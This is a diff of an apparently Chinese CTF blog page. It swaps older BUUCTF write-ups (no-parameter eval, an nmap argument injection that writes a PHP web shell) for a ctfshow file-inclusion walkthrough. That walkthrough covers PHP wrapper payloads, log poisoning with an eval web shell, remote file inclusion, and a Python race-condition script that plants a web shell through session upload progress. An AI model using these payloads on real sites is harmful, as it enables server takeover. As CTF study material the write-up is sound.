@@ -167,8 +167,8 @@
         
 
 <div class="post">
-    <a href="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/">
-        <h2 class="post-title">[GXYCTF2019]禁止套娃</h2>
+    <a href="/2024/06/12/ctfshow/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+        <h2 class="post-title">ctfshow文件包含</h2>
     </a>
     <div class="category-and-date">
         
@@ -176,7 +176,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/5/10
+            2024/6/12
         </span>
         
         
@@ -184,322 +184,177 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p><img src="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240510214924514.png" alt="image-20240510214924514"></p>
+            <p>参考wp：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46918279/article/details/120106832">CTFSHOW-文件包含_@include($file);-CSDN博客</a>（感谢大佬）</p>
+<h4 id="Web78"><a href="#Web78" class="headerlink" title="Web78"></a>Web78</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很简单的伪协议读取</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>之后base64解码即可</p>
+<p>wp中还有一种方法</p>
+<p>使用bp抓包</p>
+<p>给file传参?file&#x3D;php:&#x2F;&#x2F;input然后在post输出想要执行的代码</p>
+<p><img src="https://img-blog.csdnimg.cn/20210904223619186.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVFQxM1VH,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
+<h4 id="Web79"><a href="#Web79" class="headerlink" title="Web79"></a>Web79</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本题算是过滤了php，所以我们是用不了php协议读取了，这里同样有两种方法</p>
+<p>方法一：</p>
+<p>继续使用bp进行读取，但是所传协议</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php:input//</span><br><span class="line">改为</span><br><span class="line">Php:input//</span><br></pre></td></tr></table></figure>
+
+<p>也就是说是大小写绕过</p>
+<p>方法二：</p>
+<p>使用data伪协议</p>
+<p>这里有两种方法，一种是</p>
+<p>使用???代替php</p>
+<p>一种是将所执行命令以base64的形式上传之后通过读取方式转化为普通语句</p>
+<p>payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?= system(&#x27;tac flag.???&#x27;);?&gt;</span><br><span class="line">或</span><br><span class="line">?file=data://text/plain;base64,PD89IHN5c3RlbSgndGFjIGZsYWcuPz8/Jyk7Pz4=(&lt;?= system(&#x27;tac flag.???&#x27;);?&gt;)</span><br><span class="line"></span><br><span class="line">注：data://可以用data:代替</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web80"><a href="#Web80" class="headerlink" title="Web80"></a>Web80</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>把data ban了</p>
 <p>emm</p>
-<p>扫描</p>
-<p>git泄露</p>
-<p>githack直接拿到源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>所以上一题的方法一依旧能打</p>
+<p>而这道题重点在方法二</p>
+<p><strong>文件日志包含</strong></p>
+<p>这个Linux的nginx日志文件路径是&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log，要在用文件包含漏洞读取日志文件的同时，修改User-Agent头为我们想要执行的命令(burp中go要点两次才能执行命令，第一次将代码写入日志，第二次执行代码</p>
+<p>且操作一定不能出问题，如果报错就要销毁容器从头再来 </p>
+<p>因为php语法错误后不再解释执行后面代码，语法错误后，后面不管语法对不对都不执行了。我们包含了日志文件，如果日志文件中我们插入了错误的php代码，那么我们再次执行对的代码时会先执行那个错误的php代码，因为报错，所以后面正确的就不会执行了。</p>
+<p>所以先修改User-Agent头的value为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>就是说禁止了伪协议和很多杂七杂八的东西对吧</p>
-<p>但是是要使用伪协议类似的东西看flag的话</p>
-<p>我只知道有可能是无参数注入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+<p>之后再通过post传参读取</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240612215427081.png" alt="image-20240612215427081"></p>
+<p>flag在查看源码里</p>
+<p>还有一中方法</p>
+<p><strong>远程文件包含</strong></p>
+<p>远程文件包含可以包含其他主机上的文件，并当成php代码执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：?file=http://***.***.***.***/1.txt    </span><br><span class="line"></span><br><span class="line">1.txt里面写入代码。</span><br></pre></td></tr></table></figure>
 
+<p>就是上传一个包含了攻击代码的文本</p>
+<h4 id="Web81"><a href="#Web81" class="headerlink" title="Web81"></a>Web81</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p>过滤了:</p>
+<p>。。。</p>
+<p>大小写绕过和远程文件包含都不行了</p>
+<p>只能使用我们的日志包含（日志中的无过滤）</p>
+<h4 id="Web82"><a href="#Web82" class="headerlink" title="Web82"></a>Web82</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p>将.过滤了，所以日志包含也不能使用了！</p>
+<p>天要亡我啊！！！</p>
+<p>所以我们要在想想怎么包含</p>
+<p>看了大佬的wp发现了新方法</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406131955299.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406131956765.png" alt="img"></p>
+<p>所以我们的思路答题如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一、首先post一个和ini中设置的session.upload_progerss.name同名变量（默认为&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;），之后就会返回上传文件的实时进度并写入session文件中。session文件的内容为：（在$_SESSION中添加一组数据，索引为可以将session.upload_progress.prefix与 session.upload_progress.name连接在一起的值）</span><br><span class="line">二、在post传递PHP_SESSIOM_UPLOAD一句话木马，同时在cookie中设置名字：PHPSESSID，值：flag方便知道实时进度</span><br><span class="line">三、tem/sess_flag文件的内容会变为upload_progress_(一句话木马)</span><br><span class="line">四、完成以上步骤，include(tem/sess_flag)就会执行一句话木马中的php代码</span><br><span class="line">五、虽然文件上传结束后，php会清空session文件中的内容，但是如果我们边上传边去访问/tem/sess_aaa进行条件竞争，那么就有可能在删除session文件前访问到这个文件</span><br></pre></td></tr></table></figure>
 
+<p>注：</p>
+<p>我们能够创建session文件的原因：session里有一个默认选项，session.use_strict_mode默认值为off。也就是说此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;aaa，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_aaa”。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值。这个键值ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_aaa文件里。</p>
+<p>同时Linux系统中，session文件一般的默认存储位置为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> /var/lib/php/session</span><br><span class="line"></span><br><span class="line">/var/lib/php</span><br><span class="line"></span><br><span class="line">/var/lib/php/sessions</span><br><span class="line"></span><br><span class="line">/tmp/</span><br><span class="line"></span><br><span class="line">/tmp/sessions/</span><br></pre></td></tr></table></figure>
 
-<h4 id="无参数注入"><a href="#无参数注入" class="headerlink" title="无参数注入"></a>无参数注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`scandir(&#x27;.&#x27;)`这个函数的作用是扫描当前目录</span><br><span class="line">`localeconv()`函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是`.`</span><br><span class="line">`pos()/current()`函数返回数组第一个值</span><br><span class="line">`array_reverse()`是将数组颠倒</span><br><span class="line">`next()`将数组指针一项下一位</span><br><span class="line">`show_source()`的意思是读取函数内容</span><br></pre></td></tr></table></figure>
+<p>本题型一律采用&#x2F;tmp形式</p>
+<p>但是<strong>session.upload_progress.cleanup</strong>默认是开启的，一旦读取了所有POST数据，它就会清除进度信息，把我们session文件里的内容全部删除。所以这里我们需要利用条件竞争来读取session文件。</p>
+<p>所以方法一：</p>
+<p>通过bp手动爆破</p>
+<p>先构造一个上传文件的页面，对环境上传一个任意的文件，内容任意，并进行抓包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;https://6d5c5e02-3874-48cb-84ca-a82fad3d515b.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
-<p>三种读取方法</p>
-<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>使用使上述文件数组反转后取next位即flag.php。然后读取文件<br>构造<code>exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</code></p>
-<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>同上述方法，但方法一有局限性，只能得到数组的第二位或者倒数第二位。其他情况可以使用随机返回键名的方法(刷新几次就可以得到)<br><code>exp=show_source(array_rand(array_flip(scandir(pos(localeconv())))));</code></p>
-<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">session_start</span>(): 告诉PHP使用session;</span><br><span class="line"><span class="built_in">session_id</span>(): 获取到当前的session_id值；</span><br><span class="line">手动设置cookie中PHPSESSID=flag.php；</span><br><span class="line">所以可以构造exp=<span class="built_in">show_source</span>(<span class="built_in">session_id</span>(<span class="built_in">session_start</span>()));</span><br></pre></td></tr></table></figure>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2019-Futurella/">
-        <h2 class="post-title">[BSidesCF 2019]Futurella</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/5/10
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>查看源代码</p>
-<p>好！</p>
-<p>拿到flag</p>
-<p>啊？</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2019-Futurella/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/BUUCTF-2018-Online-Tool/">
-        <h2 class="post-title">[BUUCTF 2018]Online Tool</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/5/10
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p><img src="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/BUUCTF-2018-Online-Tool/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240510190058849.png" alt="image-20240510190058849"></p>
-<p>这里可以看到会创建一个文件以你输入进去的文件命名</p>
-<p>三个点，一个是最后一行是什么意思</p>
-<p>第二个是escapeshellarg和escapeshellcmd是什么意思</p>
-<p>第三个，payload长啥样</p>
-<p>1、</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F host</span><br><span class="line"></span><br><span class="line">-T&lt;0-5&gt; : 速度/时间模板参数，指定了扫描的速度。</span><br><span class="line"></span><br><span class="line">-sT : 使用TCP进行扫描。</span><br><span class="line"></span><br><span class="line">-Pn : 将所有主机视为在在线，跳过主机发现。</span><br><span class="line"></span><br><span class="line">--host-timeout : 设置超时时间。设置为2秒，即如果目标主机在2秒内没有响应，Nmap将放弃该主机的扫描。</span><br><span class="line"></span><br><span class="line">-F : 进行快速扫描，用于快速识别目标主机上开放的常见端口，而不扫描所有的端口。</span><br></pre></td></tr></table></figure>
-
-<p>2、</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</span><br><span class="line">功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，</span><br><span class="line">这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)</span><br><span class="line"></span><br><span class="line">escapeshellcmd — shell 元字符转义</span><br><span class="line">功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。</span><br><span class="line">此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</span><br></pre></td></tr></table></figure>
-
-<p>也就是说前后互相抵消了</p>
-<p>3、</p>
-<p>这里采用的是，将一句话木马写入文件中在通过蚁剑读取文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?host=&#x27; &lt;?php eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php</span><br></pre></td></tr></table></figure>
-
-<p>将前面的一句话木马写入hack.php中</p>
-<p>会发现</p>
-<p><img src="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/BUUCTF-2018-Online-Tool/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240510192216503.png" alt="image-20240510192216503"></p>
-<p>你处于这个文件夹之下，所以在这个文件夹下开启hackbar.php</p>
-<p>之后通过蚁剑连接网站</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://76fc35ad-270b-4945-96ce-a4c8c3809cd0.node5.buuoj.cn:81/71622f2db96673162a8eedefbeeae0ee/hack.php</span><br></pre></td></tr></table></figure>
-
-<p>从而找到flag</p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这道题的最重要的一点在于escape两个函数的应用</p>
-<p>之后要去好好看看各自的作用</p>
-<p>arg：</p>
-<p>简单地说，如果输入内容不包含单引号，则直接对输入的字符串添加一对单引号括起来；如果输入内容包含单引号，则先对该单引号进行转义，再对剩余部分字符串添加相应对数的单引号括起来。</p>
-<p>看个例子就知道了：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(escapeshellarg($_GET[p]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>先输入字符串mi1k7ea，看到escapeshellarg()会给该字符串整个加上单引号括起来，加起来总共9个字符：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;mi1k7ea&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>输入mi1k’7ea，看到先转义了中间这个单引号，再分别在左右两边加上单引号括起来，加起来总共13个字符：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;mi1k&#x27;\&#x27;&#x27;7ea&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>cmd：</p>
-<p>简单地说，第一，如果输入内容中上述出现的特殊字符会被反斜杠给转义掉；第二，如果单引号和双引号不是成对出现时，会被转义掉。</p>
-<p>输入mi1k7ea，其中不包含以上特殊字符的字符串，是不会添加单引号括起来的，内容不变：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mi1k7ea</span><br></pre></td></tr></table></figure>
-
-<p>输入’mi1k’7ea’;字符串，由于前面两个单引号成对了因此没有对其进行转义，而最后的单引号没有成对因此被转义掉，除此之外分号作为特殊字符也被转义处理：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;mi1k&#x27;7ea\&#x27;</span><br></pre></td></tr></table></figure>
-
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/BUUCTF-2018-Online-Tool/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/">
-        <h2 class="post-title">[强网杯 2019]高明的黑客</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/5/10
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <img src="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240516210127863.png" alt="image-20240516210127863" style="zoom:80%;">
-
-<p>下载源码之后解压</p>
-<p>发现了三千多文件，要找到可以用的参数</p>
+<p>修改上传的文件包</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406132033438.png" alt="image-20240613203330399"></p>
+<p> 注意两点：</p>
+<p>（1）设置Cookie：PHPSEESSID&#x3D;flag、这样我们的session就为&#x2F;tmp&#x2F;sess_flag</p>
+<p>（2）设置同名变量PHP_SESSION_UPLOAD_PROGRESS，设置值为我们想要存入session文件的代码。（把第一步中value&#x3D;123的改掉即可，这里对123加上§§是为了进行爆破payload用）</p>
+<p>之后包含session文件并且抓包</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406132033959.png" alt="image-20240613203346930"></p>
+<p>进行爆破</p>
+<p>将两个项目payload设置如下</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406132036273.png" alt="image-20240613203603243"></p>
+<p>开始爆破</p>
+<p>最后将ls改为tac fl0g.php即可</p>
+<p>或方法二：</p>
 <p>脚本如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">print(&#x27;开始时间：  &#x27;+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(100)  							  			#这儿设置最大的线程数</span><br><span class="line">filePath = r&quot;D:\phpstudy_pro\WWW\src&quot;</span><br><span class="line">os.chdir(filePath)													#改变当前的路径</span><br><span class="line">requests.adapters.DEFAULT_RETRIES = 5								#设置重连次数，防止线程数过高，断开连接</span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = False											 # 设置连接活跃状态为False</span><br><span class="line">def get_content(file):</span><br><span class="line">    s1.acquire()</span><br><span class="line">    print(&#x27;trying   &#x27;+file+ &#x27;     &#x27;+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    with open(file,encoding=&#x27;utf-8&#x27;) as f:							#打开php文件，提取所有的$_GET和$_POST的参数</span><br><span class="line">            gets = list(re.findall(&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;, f.read()))</span><br><span class="line">            posts = list(re.findall(&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;, f.read()))</span><br><span class="line">    data = &#123;&#125;														#所有的$_POST</span><br><span class="line">    params = &#123;&#125;														#所有的$_GET</span><br><span class="line">    for m in gets:</span><br><span class="line">        params[m] = &quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br><span class="line">    for n in posts:</span><br><span class="line">        data[n] = &quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br><span class="line">    url = &#x27;http://127.0.0.1/src/&#x27;+file</span><br><span class="line">    req = session.post(url, data=data, params=params)			#一次性请求所有的GET和POST</span><br><span class="line">    req.close()												# 关闭请求  释放内存</span><br><span class="line">    req.encoding = &#x27;utf-8&#x27;</span><br><span class="line">    content = req.text</span><br><span class="line">    #print(content)</span><br><span class="line">    if &quot;xxxxxx&quot; in content:									#如果发现有可以利用的参数，继续筛选出具体的参数</span><br><span class="line">        flag = 0</span><br><span class="line">        for a in gets:</span><br><span class="line">            req = session.get(url+&#x27;?%s=&#x27;%a+&quot;echo &#x27;xxxxxx&#x27;;&quot;)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()												# 关闭请求  释放内存</span><br><span class="line">            if &quot;xxxxxx&quot; in content:</span><br><span class="line">                flag = 1</span><br><span class="line">                break</span><br><span class="line">        if flag != 1:</span><br><span class="line">            for b in posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:&quot;echo &#x27;xxxxxx&#x27;;&quot;&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()												# 关闭请求  释放内存</span><br><span class="line">                if &quot;xxxxxx&quot; in content:</span><br><span class="line">                    break</span><br><span class="line">        if flag == 1:													#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span><br><span class="line">            param = a</span><br><span class="line">        else:</span><br><span class="line">            param = b</span><br><span class="line">        print(&#x27;找到了利用文件： &#x27;+file+&quot;  and 找到了利用的参数：%s&quot; %param)</span><br><span class="line">        print(&#x27;结束时间：  &#x27; + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line">for i in files:															#加入多线程</span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import io</span><br><span class="line">import threading</span><br><span class="line"> </span><br><span class="line">url=&#x27;http://08d4a04e-19b3-4049-8a81-e9c6226eee2f.challenge.ctf.show:8080/&#x27;</span><br><span class="line">#设置PHPSESSID的值</span><br><span class="line">sessionid=&#x27;ctfshow&#x27;     </span><br><span class="line">data=&#123;&quot;1&quot;:&quot;file_put_contents(&#x27;/var/www/html/tao.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">#为了进行条件竞争，需要一边写一边读</span><br><span class="line"> </span><br><span class="line">#进行上传文件时需要post传递名为PHP_SESSION_UPLOAD_PROGRESS值为一句话木马</span><br><span class="line">def write(session):</span><br><span class="line">	fileBytes = io.BytesIO(b&#x27;a&#x27;*1024*50)          #生产一个50k的文件</span><br><span class="line">	while True:</span><br><span class="line">		response=session.post(url,</span><br><span class="line">			data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;&#125;,</span><br><span class="line">			cookies=&#123;&#x27;PHPSESSID&#x27;:sessionid&#125;,</span><br><span class="line">			files=&#123;&#x27;file&#x27;:(&#x27;ctfshow.jpg&#x27;,fileBytes)&#125;    #设置文件名字和内容</span><br><span class="line">			)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">#读取session文件，这里文件为/tmp/sess_ctfshow</span><br><span class="line"> </span><br><span class="line">def read(session):</span><br><span class="line">	while True:</span><br><span class="line">		response=session.post(url+&#x27;?file=/tmp/sess_&#x27;+sessionid,data=data)</span><br><span class="line">		response2=session.get(url+&#x27;tao.php&#x27;);</span><br><span class="line">		if response2.status_code==200:</span><br><span class="line">			print(&#x27;++++++++++++++++++++&#x27;)</span><br><span class="line">		else:</span><br><span class="line">			print(response2.status_code)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line"> </span><br><span class="line">	#开启多线程进行竞争	</span><br><span class="line">	evnet=threading.Event()</span><br><span class="line">	with requests.session() as session:			</span><br><span class="line">		for i in range(20):</span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		for i in range(20):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">	evnet.set()</span><br></pre></td></tr></table></figure>
 
-<p>最终找到了利用文件： xk0SzyKwfzw.php </p>
-<p>找到了利用的参数：Efa5BVG</p>
-<p>最后构造payload：</p>
